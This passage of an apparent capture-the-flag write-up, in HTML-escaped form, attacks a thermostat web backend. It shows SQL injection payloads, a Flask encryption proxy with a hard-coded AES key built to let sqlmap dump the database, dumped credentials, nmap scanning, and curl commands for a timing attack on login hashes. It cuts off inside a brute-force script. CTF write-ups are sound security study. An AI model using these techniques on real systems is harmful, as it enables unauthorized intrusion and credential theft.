\u0026#39;{\u0026quot;username\u0026quot;:\u0026quot;admin\u0026#39;\\\u0026#39;\u0026#39; and 1=1#\u0026quot;, \u0026quot;password\u0026quot;:\u0026quot;password\u0026quot;, \u0026quot;cmd\u0026quot;:\u0026quot;getTemp\u0026quot;}\u0026#39;\n{\u0026quot;temperature\u0026quot;: 73, \u0026quot;success\u0026quot;: true}\nroot@pwnbox16:~/files# python remote.py \u0026#39;{\u0026quot;username\u0026quot;:\u0026quot;admin\u0026#39;\\\u0026#39;\u0026#39; and 1=2#\u0026quot;, \u0026quot;password\u0026quot;:\u0026quot;password\u0026quot;, \u0026quot;cmd\u0026quot;:\u0026quot;getTemp\u0026quot;}\u0026#39;\n{\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Invalid username or password\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e1=1 returns true while 1=2 makes the statement false, making it return \u003ccode\u003eInvalid username/password\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eIdeally at this point, I would\u0026#39;ve used SQLMap to dump the whole db because blind SQLi is tedious but since everything is encrypted, I cannot directly use SQLmap.\u003c/p\u003e\n\n\u003cp\u003eNow, I can either script the blind SQLi or use some trick to get SQLmap to work. I decided to go with the latter.\u003c/p\u003e\n\n\u003cp\u003eThe brilliant idea is to write simple webapp in Flask which would take the plaintext values as GET parameters, encrypt them and forward them to the actual server and return the decrypted response, acting like a encryption/decryption proxy.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eflask\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eFlask\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\n\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003eCrypto.Cipher\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003epad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003epadn\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003echr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epadn\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"n\"\u003epadn\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eunpad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"nb\"\u003eord\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e])]\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eKEY\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x38\\x4f\\x2e\\x6a\\x1a\\x05\\xe5\\x22\\x3b\\x80\\xe9\\x60\\xa0\\xa6\\x50\\x74\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\n\n\n\u003cspan class=\"n\"\u003eapp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eFlask\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003e__name__\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eroute\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ehack\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n    \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;username\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;password\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eenc\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;A\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eKEY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;A\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;base64\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eresp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epost\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;d\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eenc\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;base64\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eunpad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eKEY\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eAES\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eMODE_CBC\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eresp\u003c/span\u003e\u003cspan class=\"p\"\u003e[:\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edecrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eresp\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"p\"\u003e:]))\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003e__name__\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;__main__\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eapp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ehost\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;0.0.0.0\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ethreaded\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"bp\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow I can basically run SQLmap on localhost with plaintext values and not worry about any encryption/decryption. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files# python sqlmap.py -u \u0026quot;http://localhost:5000/?username=admin\u0026amp;password=admin\u0026quot; --level 5 --risk 3 --dump\n        ___\n       __H__\n ___ ___[\u0026quot;]_____ ___ ___  {1.2.11.6#dev}\n|_ -| . [.]     | .\u0026#39;| . |\n|___|_  [\u0026#39;]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n\u0026lt;snip\u0026gt;....\nsqlmap identified the following injection point(s) with a total of 556 HTTP(s) requests:\n---\nParameter: username (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin\u0026#39; AND 2307=(SELECT (CASE WHEN (2307=2307) THEN 2307 ELSE (SELECT 8582 UNION SELECT 1355) END))-- zTlo\u0026amp;password=admin\u0026amp;cmd=getTemp\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u0026gt;= 5.0.12 AND time-based blind\n    Payload: username=admin\u0026#39; AND SLEEP(5)-- fbmN\u0026amp;password=admin\u0026amp;cmd=getTemp\n---\n[18:25:51] [INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork)\n[18:25:51] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries\n[18:25:51] [INFO] fetching current database\n[18:25:51] [WARNING] running in a single-thread mode. Please consider usage of option \u0026#39;--threads\u0026#39; for faster data retrieval\n[18:25:51] [INFO] retrieved: flitebackend\n\u0026lt;snip\u0026gt;....\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003eflitebackend\u003c/code\u003e looks like main DB and it only has two tables named \u003ccode\u003eusers\u003c/code\u003e and \u003ccode\u003edevices\u003c/code\u003e. The \u003ccode\u003eusers\u003c/code\u003e table only has one entry\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDatabase: flitebackend\nTable: users\n[1 entry]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n+----+----------+----------------------------------+\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003edevices\u003c/code\u003e table has 151 entries, essentially consisting of IPs\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 192.88.99.253   |\n| 2   | 192.88.99.252   |\n| 3   | 10.90.120.23    |\n| 4   | 244.188.235.4   |\n\u0026lt;snip\u0026gt;....\n| 149 | 243.99.63.239   |\n| 150 | 10.17.63.143    |\n| 151 | 192.88.99.59    |\n+-----+-----------------+\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe next logical course of action would be related to the IPs, so we nmap-ed all the IPs.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@pwnbox16:~/files# for ip in `cat IPs.txt`; do nmap -v \u0026quot;$ip\u0026quot;; done\n\nStarting Nmap 7.01 ( https://nmap.org ) at 2019-03-03 02:59 UTC\nInitiating Ping Scan at 02:59\nScanning 192.88.99.253 [4 ports]\nCompleted Ping Scan at 02:59, 0.20s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 02:59\nCompleted Parallel DNS resolution of 1 host. at 02:59, 0.00s elapsed\n\u0026lt;snip\u0026gt;....\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe only IP that stood out is the \u003ccode\u003e104.196.12.98\u003c/code\u003e because it had port 80 open. We see a promising \u003ccode\u003eFliteThermostat login\u003c/code\u003e page when visiting it.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Selection_203.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/443/175464f5da895a913802bd9018cb5f87ece64fdd/Selection_203.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_203.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_203.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=708f7aa76754f7b9d4f8a0df16871c000e0845e31848b16fea4fbb0c73ea920a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/443/175464f5da895a913802bd9018cb5f87ece64fdd/Selection_203.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_203.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_203.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQY55CA6OQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061021Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEcehEzJ6wx5cJVBI4ifSuKdHpXuLtuSHmh8SQmXgyhZAiEAmRgGrwChBEkjjlBm%2FjlBtMcBhRzrhQNXyXI9xj%2BctvcqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDAcHHyX1klaXROO7PiqRAwolqCQb1T1qFrFJAaWyztYE1JDBuzLZ4RwAyeKpcLUT4tyRqOd0dd8i4Q%2Bdjr6CKjIwT4czi1qgG1Zc64xBVWsgift2qy2JjNaoHLTUAc2KLDUNHA0TNoe8bX0oc8a%2FwT8uTFJC95SwDTvxHJ1p0gXKjQzsPS8Pmchr%2B084C8EjUen3Ep0CWQzdO%2FqpzpNi57wg8K7fKdB1QGnYNWoZdB5Oy5EISNv9tG0KxDsBpen93okG220BUzCnopM029Epvj2JEWxnATinRfem%2FweYutcyMAcCkbrgBQ8K8e1gHB5A%2B0u28Q%2FVcP31FhOWgULsAluXkn3GslCMytJCmgqijruu4ZYTEnan%2FWKY5YIAA7lqa3BGrYfkahBrQoqEjUUVdIMtzaJamU8Ar78sCeOuD1pmEl%2BL11bJnsiKfDWlGrVeGbAfhGOY8kc%2Fl0wOCOrTXSudIuxOce8DyfTk8hDaOyvB1s7B5C1EjmMCLhImkKwIX2OwfxK%2BL3R40TJMB8Cpgj1PZYAX4%2FoTvwQ2NE7lqB1NMJ2Eqv8FOusBa2sano2o9LnQ3Zz62xDTky5R5ZhcEoLoUN10wDcNGN%2Bl7jbC3Je6yQISTTUZUnFVUaCZviUohA31W7wKMqcULZ8gdS95RnBq56Jnr5mGBpMl01uOWWwq9VYekx0eqwrKG0fnJZt8nzuga5YXIEEdK00GhGaiOPPln2qn0JVgHc7HAmAbONUCYQPXTsMwDpIiMtxst0E4pt9%2BY%2Bmr5CmKeOg9Cr%2F3ZLSrZYQfcVbd%2BLr3n2r8jmT9zA0weoyT0PAWCkOVSyWi1l2NnOIuIVvfIX4Z6FKNLRAS%2BMDRVCl0b%2Bmn7Qq3MoosKsUkOQ%3D%3D\u0026amp;X-Amz-Signature=708f7aa76754f7b9d4f8a0df16871c000e0845e31848b16fea4fbb0c73ea920a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eTrying to login, we observe a weird behaviour. Instead of sending the username and password in the login request, it actually sent a custom hash based on our username/password, derived from \u003ca title=\"http://104.196.12.98/login.js\" href=\"/redirect?url=http%3A%2F%2F104.196.12.98%2Flogin.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://104.196.12.98/login.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThe hash is based on \u003ca href=\"/redirect?url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FRC4\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eRC4\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and XORs but I won\u0026#39;t go deep into explaining it as it\u0026#39;s irrelevant for the CTF. \u003c/p\u003e\n\n\u003cp\u003eThis is where we got stuck for a few hours. During that time, we went back to the original SQLi and chased the rabbit of trying to read local files using \u003ccode\u003eload_file()\u003c/code\u003e as it was running as \u003ccode\u003eroot@localhost\u003c/code\u003e user.\u003c/p\u003e\n\n\u003cp\u003eOther than that, we also found a \u0026quot;setTemp\u0026quot; command in the \u003ccode\u003eThermostatModel.java\u003c/code\u003e of the android apk but it wasn\u0026#39;t useful either.\u003c/p\u003e\n\n\u003cp\u003eWhen nothing else panned out, we went back and just started playing with the endpoint more.  During the recon process, we dirsearched and found a few endpoints but all of them just 302-ed back to root as they probably required authentication.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\nTarget: http://104.196.12.98/\n\n[20:18:02] Starting: \n[20:18:04] 400 -  157B  - /%2e%2e/google.com\n[20:18:44] 302 -  209B  - /control  -\u0026gt;  http://104.196.12.98/\n[20:19:33] 302 -  209B  - /main  -\u0026gt;  http://104.196.12.98/\n[20:20:05] 302 -  209B  - /update  -\u0026gt;  http://104.196.12.98/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDeducing from the response headers, especially the all caps \u0026quot;METHOD NOT ALLOWED\u0026quot; when sending an invalid http verb, it felt like a Flask webapp running behind the nginx.\u003c/p\u003e\n\n\u003cp\u003eAfter a few hours of misery, we finally had a breakthrough. \u003c/p\u003e\n\n\u003cp\u003eIf we send a hash of the length 64, which is what login.js generates, it would take 0.5 seconds for a response but if the length is not 64, it would return in 0.05 seconds. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eubuntu@ip-172-31-22-54:~$ time curl -X POST \u0026#39;http://104.196.12.98/\u0026#39; -d \u0026#39;hash=abcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabca\u0026#39;\n....\nreal    0m0.559s\nuser    0m0.008s\nsys 0m0.000s\n\nubuntu@ip-172-31-22-54:~$ time curl -X POST \u0026#39;http://104.196.12.98/\u0026#39; -d \u0026#39;hash=aaaaa\u0026#39;\n....\nreal    0m0.057s\nuser    0m0.008s\nsys 0m0.000s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis points to your typical timing attack. \u003ca href=\"/corb3nik\"\u003e@corb3nik\u003c/a\u003e wrote a quick script to verify it by bruting the first byte (2 characters as it\u0026#39;s hex encoded) and sure enough, the first byte is \u003ccode\u003ef9\u003c/code\u003e. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eubuntu@ip-172-31-22-54:~$ time curl -X POST \u0026#39;http://104.196.12.98/\u0026#39; -d \u0026#39;hash=f9cdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcdabcd\u0026#39;\n...\nreal    0m1.059s\nuser    0m0.004s\nsys 0m0.004s\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt took 0.5 more seconds than usual, and now it\u0026#39;s just a matter of scripting it. The server was kinda unreliable, so we did some super advanced heuristics to get the right character.\u003c/p\u003e\n\n\u003cp\u003eHere is the final script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e#!/usr/bin/env python3\n\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ebinascii\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ethreading\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eURL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://104.196.12.98/\u0026quot;\u003c/span\u003e\n\u003cspan 